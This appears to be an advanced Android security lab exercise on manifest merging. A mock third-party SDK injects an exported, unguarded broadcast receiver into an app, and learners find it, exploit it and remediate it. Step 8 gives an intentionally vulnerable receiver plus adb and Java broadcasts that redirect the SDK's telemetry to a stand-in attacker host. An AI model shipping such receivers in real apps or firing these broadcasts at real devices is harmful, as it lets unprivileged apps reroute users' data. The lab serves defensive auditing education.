# Lab 05 — Merge and Inject

**Difficulty:** Advanced
**Time:** 2–3 hours
**Prerequisites:** [Lab 02](lab-02-full-audit.md), [Chapter 32 — manifest merging](../README.md),
[08-Build-System](../../08-Build-System/README.md)

---

## Objective

Build an app that depends on a library whose manifest injects an **exported component the app
developer never wrote**. Find it in the merged output, prove it is reachable, and then work out how
you would have found it as an auditor with only the APK.

## Why this matters

Almost every auditing habit people learn is applied to the *source* manifest. That is not what ships.

At build time, the manifests of every library the app depends on are merged into the app's. A
third-party SDK — analytics, ads, crash reporting, a payments widget — can contribute activities,
services, receivers and providers, and it can mark them exported. The app developer may have no idea
they exist; they often do not appear in code review; and they are in the shipped APK regardless.

This is a real and recurring source of findings, and it is invisible if you audit the wrong file.

---

## Setup

You need Android Studio or a working Gradle command line.

```bash
# host
./gradlew --version
```

Create a new project with **two** modules: an app and an Android library.

```
merge-lab/
├── settings.gradle.kts
├── app/
│   ├── build.gradle.kts
│   └── src/main/AndroidManifest.xml
└── analytics-sdk/
    ├── build.gradle.kts
    └── src/main/AndroidManifest.xml
```

**`settings.gradle.kts`**

```kotlin
include(":app")
include(":analytics-sdk")
```

---

## Steps

### Step 1 — Write a deliberately clean app manifest

**`app/src/main/AndroidManifest.xml`** — this is what the developer thinks their app contains:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:allowBackup="false"
        android:label="MergeLab"
        android:theme="@style/Theme.AppCompat">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>
</manifest>
```

One activity, exported because it is the launcher. Nothing else. A reviewer reading this file would
report a clean manifest.

**Q1.** Write down what you would report from this file alone.

### Step 2 — Write the library manifest

**`analytics-sdk/src/main/AndroidManifest.xml`** — the SDK's contribution:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- The SDK "needs" these. The app developer never sees this file. -->
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />

    <application>

        <!-- An exported receiver with NO permission guard.
             Any app on the device can send it a broadcast. -->
        <receiver
            android:name="com.vendor.analytics.CommandReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="com.vendor.analytics.ACTION_CONFIG" />
            </intent-filter>
        </receiver>

        <!-- An exported service. -->
        <service
            android:name="com.vendor.analytics.UploadService"
            android:exported="true" />

        <!-- A ContentProvider used for automatic initialisation.
             This is the androidx.startup pattern - it runs BEFORE
             Application.onCreate. See ../../09-Android-App-Internals/. -->
        <provider
            android:name="com.vendor.analytics.AnalyticsInitProvider"
            android:authorities="${applicationId}.analytics-init"
            android:exported="false"
            android:initOrder="100" />

        <!-- Configuration, including a key. -->
        <meta-data
            android:name="com.vendor.analytics.API_KEY"
            android:value="ak_live_3f9c2b7e1d4a8f60" />

    </application>
</manifest>
```

**Q2.** How many components does this add? How many are exported? What permissions does it add?

### Step 3 — Implement the injected receiver

**`analytics-sdk/src/main/java/com/vendor/analytics/CommandReceiver.java`**

```java
package com.vendor.analytics;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

/**
 * A realistic SDK receiver. It exists so the vendor can push configuration
 * changes. It is exported with no permission, which means ANY app on the
 * device can send it a broadcast.
 */
public class CommandReceiver extends BroadcastReceiver {

    private static final String TAG = "AnalyticsSDK";

    @Override
    public void onReceive(Context ctx, Intent intent) {
        String cmd = intent.getStringExtra("cmd");
        String value = intent.getStringExtra("value");

        Log.i(TAG, "CommandReceiver: cmd=" + cmd + " value=" + value);

        SharedPreferences prefs =
            ctx.getSharedPreferences("analytics", Context.MODE_PRIVATE);

        if ("set_endpoint".equals(cmd)) {
            // An attacker can redirect the SDK's telemetry.
            prefs.edit().putString("endpoint", value).apply();
            Log.i(TAG, "endpoint set to " + value);
        } else if ("set_optout".equals(cmd)) {
            prefs.edit().putBoolean("optout", Boolean.parseBoolean(value)).apply();
        } else if ("flush".equals(cmd)) {
            Log.i(TAG, "flushing queued events to " +
                       prefs.getString("endpoint", "https://t.vendor.example/v1"));
        }
    }
}
```

### Step 4 — Wire the dependency and build

**`app/build.gradle.kts`**

```kotlin
dependencies {
    implementation(project(":analytics-sdk"))
}
```

```bash
# host
./gradlew :app:assembleDebug
```

### Step 5 — Read the merged manifest

```bash
# host
find app/build -path '*merged_manifest*' -name 'AndroidManifest.xml'
cat app/build/intermediates/merged_manifest/debug/AndroidManifest.xml
```

**Q3.** Compare it against what you wrote in Step 1. What is now in the shipped manifest that the app
developer never wrote?

**Q4.** Did the permissions from the library appear? Would a user see them at install/runtime?

### Step 6 — Read the merger report

```bash
# host
find app/build -name 'manifest-merger-*-report.txt'
cat app/build/outputs/logs/manifest-merger-debug-report.txt
```

This file attributes **every element and attribute to its source**.

**Q5.** For the injected receiver, what does the report say about where it came from?

**Q6.** Were there any conflicts the merger resolved silently? What rule did it apply?

### Step 7 — Verify against the built APK

The merged manifest is an intermediate. Confirm what actually shipped.

```bash
# host
APK=app/build/outputs/apk/debug/app-debug.apk
aapt2 dump xmltree $APK --file AndroidManifest.xml | grep -A4 -E 'receiver|service|provider'
```

```bash
# host — and the platform's view
adb install -r $APK
adb shell dumpsys package <your.package> | grep -n 'exported=true'
```

**Q7.** Do the source manifest, the merged manifest, the APK and `dumpsys` agree? Which of the four
would you cite in a report?

### Step 8 — Exploit the injected component

Prove the receiver is reachable from an ordinary app — not from `adb shell`.

First the quick shell check:

```bash
# adb shell
am broadcast -a com.vendor.analytics.ACTION_CONFIG \
  --es cmd set_endpoint --es value "https://attacker.example/collect"
```

```bash
# host
adb logcat -s AnalyticsSDK
```

Now the version that actually proves it. Add to your probe app from
[Lab 03](lab-03-proving-reachability.md):

```java
Intent i = new Intent("com.vendor.analytics.ACTION_CONFIG");
i.setPackage("com.example.mergelab");          // explicit target
i.putExtra("cmd", "set_endpoint");
i.putExtra("value", "https://attacker.example/collect");
sendBroadcast(i);
Log.i(TAG, "broadcast sent");
```

**Q8.** Did the receiver fire? Confirm from the **target's** logcat, not from the sender's — a
`sendBroadcast` that throws no exception proves nothing.

**Q9.** Did the endpoint actually change?

```bash
# adb shell as root
cat /data/data/com.example.mergelab/shared_prefs/analytics.xml
```

**Q10.** What have you just demonstrated, in one sentence a client would understand?

### Step 9 — Now audit it as a black box

Delete your source tree from your mind. You have only the APK.

```bash
# host
apktool d -f $APK -o blackbox/ >/dev/null
grep -A6 -E '<receiver|<service|<provider' blackbox/AndroidManifest.xml
grep -oE '<meta-data[^>]*' blackbox/AndroidManifest.xml
```

**Q11.** Can you tell which components came from the app and which from a library? What clues are
available — package naming, `${applicationId}` substitution, the `meta-data` keys?

**Q12.** Find the API key. Is it a finding? What would you need to check before saying so?

**Q13.** How would you determine *which* SDK contributed the receiver, given only the APK?

### Step 10 — Suppress the injection

Now play the developer. Remove the injected receiver without modifying the library.

```xml
<!-- app/src/main/AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
          xmlns:tools="http://schemas.android.com/tools">
    <application>
        <receiver
            android:name="com.vendor.analytics.CommandReceiver"
            tools:node="remove" />
    </application>
</manifest>
```

```bash
# host
./gradlew :app:assembleDebug
aapt2 dump xmltree app/build/outputs/apk/debug/app-debug.apk --file AndroidManifest.xml \
  | grep -c CommandReceiver
```

**Q14.** Is it gone? Does the app still build and run?

Now try the other markers:

| Marker | Try it on | Question |
|---|---|---|
| `tools:node="remove"` | the receiver | Does it remove the whole element? |
| `tools:node="replace"` | the receiver, with `exported="false"` | Does it override the library's version? |
| `tools:remove="android:exported"` | the receiver | What is the export state afterwards? |
| `tools:replace="android:value"` | the `meta-data` | Can you neutralise the key? |

**Q15.** Which marker is the right remediation to recommend, and why? Consider that removing a
component an SDK expects may break it at runtime.

---

## Hints

<details>
<summary>Hint 1 — the merged manifest is not where I expect</summary>

The path varies by AGP version. Search rather than guessing:

```bash
find . -name 'AndroidManifest.xml' -path '*build*' | grep -i merge
find . -name 'manifest-merger-*-report.txt'
```

In Android Studio: open the manifest and use the **Merged Manifest** tab at the bottom, which shows
the result with per-element source attribution.
</details>

<details>
<summary>Hint 2 — the broadcast does not fire</summary>

Three usual causes. From the probe app you must call `setPackage()` — implicit broadcasts to a specific
app are restricted. You need the `<queries>` declaration to see the target package on targetSdk 30+.
And check the target's logcat, not the sender's:

```bash
adb logcat --pid=$(adb shell pidof -s com.example.mergelab)
```
</details>

<details>
<summary>Hint 3 — tools:node="remove" does not work</summary>

You must declare the `tools` namespace on the `<manifest>` element:

```xml
xmlns:tools="http://schemas.android.com/tools"
```

The element you are removing must also match by `android:name` exactly, including the full package.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1 vs Q3.** This is the whole lab. The source manifest declares one activity. The merged manifest
contains an exported receiver, an exported service, an auto-initialising provider, two additional
permissions and an API key — none of which the app developer wrote or is likely aware of.

**Q4.** Library permissions merge in and are requested by the app. `READ_PHONE_STATE` is a dangerous
permission, so the user sees a runtime prompt for something the app's own code never asked for. This is
a genuine and common privacy finding.

**Q5–Q6.** The merger report attributes each element to its source file with a line reference. It also
records the rule applied to each conflict. Reading it is the fastest way to answer "where did this
come from" during a source-assisted review.

**Q7.** All four should agree, and `dumpsys package` is what you cite — it is what the platform
actually parsed. The source manifest is the one you must **not** cite, because it is not what shipped.

**Q10.** "Any application installed on the device — with no permissions of its own — can redirect this
app's analytics telemetry to a server the attacker controls, by sending a single broadcast." That is
the sentence a client acts on.

**Q11.** Clues that a component came from a library: a package name unrelated to the app's own
(`com.vendor.analytics` in an app whose package is `com.example.mergelab`); `${applicationId}`
substitution in a provider authority, which is the conventional library pattern; and `meta-data` keys
namespaced to the vendor. None is conclusive on its own, but together they are a reliable signal.

**Q12.** An API key in `<meta-data>` is a *candidate*, not automatically a finding. Some keys are
designed to be client-visible and are restricted server-side. Before reporting, establish what the key
authorises and whether it is restricted — see [52-StaticAnalysis](../../52-StaticAnalysis/README.md)
on validating hits.

**Q13.** Search the DEX for the component's class and look at the surrounding package; check for the
SDK's own strings and initialisation provider; and fingerprint the library version from class
signatures or embedded version resources. See [17-Libraries](../../17-Libraries/README.md).

**Q15.** `tools:node="remove"` eliminates the component entirely, which is the strongest fix but may
break the SDK if it expects the receiver to exist. `tools:node="replace"` with `exported="false"`
keeps the component but removes the exposure, which is usually the better recommendation — the SDK
still works, and the attack surface is gone. Recommending the correct one requires knowing what the
SDK does with it, which is why "just remove it" is not always the right advice.

</details>

---

## Success criteria

- [ ] You built an app whose merged manifest contains components its own manifest does not
- [ ] You located the merged manifest and the merger report
- [ ] You confirmed the injected components are present in the built APK and in `dumpsys`
- [ ] You know which of the four views to cite in a report, and why
- [ ] You triggered the injected receiver from an **unprivileged app**, confirming from the target's log
- [ ] You verified the state change on disk rather than trusting the log
- [ ] You can state the impact in one sentence a non-technical stakeholder would act on
- [ ] You re-audited the APK as a black box and identified which components came from a library
- [ ] You suppressed the injection with `tools:node` and understand the trade-off between `remove` and `replace`
- [ ] You will never again audit a source manifest and call it done
